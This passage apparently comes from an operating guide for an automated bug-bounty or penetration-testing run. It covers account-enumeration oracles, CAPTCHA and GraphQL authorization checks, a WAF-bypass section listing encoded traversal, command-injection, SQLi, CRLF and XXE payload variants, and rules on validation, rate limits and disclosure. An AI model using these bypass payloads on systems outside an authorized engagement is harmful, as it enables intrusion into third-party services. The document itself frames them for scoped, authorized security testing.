57. **Login/reset oracles**: diff valid vs invalid account responses (message, status, body length, median timing over ~30 samples — valid users get bcrypt-hashed, invalid short-circuit) on login, register, and forgot-password; timing/length deltas on login can confirm a correct password without lockout. Enumeration is commonly Low/Info — check CONTRACT.md before reporting.
58. **CAPTCHA server-side absence**: omit the field entirely, send empty/null, replay a solved token, reuse a token across endpoints; check whether CAPTCHA is enforced only after N failures.
59. **GraphQL authz nuances**: alias batching to collapse N mutations into one request (fire only if resolvers run concurrently and policy permits); negative `first:-100` to refill query-cost budgets; REST↔GraphQL dual-write desync (a revoked privilege persisting on one path); removed members' tokens staying valid after soft-delete.

If no credentials are provided, skip Phase 3 and state that clearly.

## WAF / filter bypass guidance

- When a payload is blocked, escalate encoding one step at a time: URL-encode → double-encode → unicode/fullwidth variants (NFKC collapse: `‥/` U+2025→`..`, `＇` U+FF07→`'`, `＜` U+FF1C→`<`) → case mixing. One retry per variant, then stop.
- Class-specific variants (counted in the same cap): traversal — `%2e%2e%2f`, `%252e%252e%252f`, `....//`; command injection — `${IFS}`, `%09`, brace expansion, quote-splitting (`w"h"oami`); SQLi — alt whitespace (`%09`/`%a0`), inline comments (`AN/**/D`), versioned comments (`/*!50000AND*/`), unicode quote smuggling (`%CA%BA`); XXE — UTF-16 encoding; CRLF — `嘊`/`嘍` (low bytes 0A/0D); `javascript:` scheme — `java%09script:`, entity-encoded scheme.
- Content-Type confusion: resubmit blocked API probes as `application/json`, `application/x-www-form-urlencoded`, `multipart/form-data`, and `text/plain` — the parser behind the WAF often differs from the WAF's own. Add duplicate JSON keys (`{"id":"10","id":"100"}`) for Mongo-backed parsers.
- PHP validators: one oversized input to exhaust `pcre.backtrack_limit` can make `preg_match` fail open (fast, limit-capped — not a DoS).
- Bypass attempts count against the same rate limit: **max 3 variants per blocked payload**, then record `blocked by WAF` in `STATE.md` and move on. Do not hammer the edge.

## Validation discipline (before writing anything up)

- **Impact-only filter**: submit only bugs with a demonstrated chain to attacker-attainable harm. Missing headers, stack traces, version banners, and permissive CSP are context that arms other attacks — never standalone findings.
- **Cross-account proof**: prove every access-control finding with two test accounts — attacker session retrieving or modifying the victim's data. A 200 status or a self-only effect is not proof.
- **Body-diff rule**: a bypass claim requires a response-body differential, not just a status-code change — diff bodies byte-for-byte against baseline (proxies normalize headers/hosts).
- **Policy-vs-state check**: before claiming an oracle (user enum, file existence), verify the response difference tracks actual server-side state, not a static policy (denylist, WAF rule) that fires regardless of the resource's existence.
- **Statistical-sample rule**: any timing-based claim (user enum, blind injection, side channel) requires ≥10 interleaved control/test trials in randomized order with the suspect mean ≥2σ above control; single-shot outliers are jitter, not signal.
- **Multi-tool reproduction**: reproduce any Critical/High with two independent HTTP stacks (e.g. curl + Python `requests` or raw socket) before claiming it, and include the exact copy-paste reproduction commands in the report.
- **Pre-severity gate**: before labeling Critical/High, answer in one line each: Is the full chain to attacker impact validated end-to-end, or only a primitive mid-chain? What does the attacker walk away with, concretely? Reproduced twice? Is any check still gating the chain? Does the program cap this class? A confirmed-but-gated primitive ships at the primitive's severity, not the chain's.
- **Retraction discipline**: never silently drop a failed finding — log a retraction entry (original signal, disproving evidence, why it looked like a bug, date). If a submitted finding stops reproducing, self-retract preemptively.
- **Sibling sweep**: after each confirmed bug, time-box ~20 minutes to sweep the same technique across sibling endpoints in the same controller, other HTTP methods on the same path, older API versions, and sister apps sharing infra. File each independently valid bug as its own report — don't bundle two bugs into one submission unless they form a single attack chain.

## Rules for the run

- Sequential requests with sleep; stop on WAF escalation, 429s, or any instability.
- Save every request/response pair supporting a finding under `engagement/findings/`.
- **Evidence hygiene**: capture evidence without secrets where possible (console PoCs with `credentials:'include'`, hide the request panel before screenshots); black-bar victim PII and note the unredacted version is available privately on request; sanitize HARs (strip Cookie/Authorization/Set-Cookie) before attaching; rotate test-account credentials after each submission so any credential visible in evidence is dead.
- **Duplicate check** (Mode A): before writing up any finding, check the program's disclosed-reports feed (e.g. HackerOne hacktivity) and known-issues list; flag likely duplicates as such instead of reporting them fresh.
- Severity honesty: Medium/High requires demonstrated exploitability and security impact, judged against the program's own guidance (Mode A) or the validation discipline section (Mode B); everything else is Informational. Do not inflate — triagers reject inflated reports. If the platform taxonomy under-severities a genuine finding, open the report with a severity-request paragraph anchored in the CVSS vector, the program's own accepted-impact list, and a quoted rebuttal of the closest out-of-scope clause.
- Deliverable: findings summary table (host, endpoint, class, severity, evidence file, reproduction steps) written to `engagement/FINDINGS.md`.
- Honor the disclosure terms: the program's disclosure policy in Mode A, the user's stated constraints in Mode B — no public disclosure without approval; securely delete `engagement/` after reports are submitted.
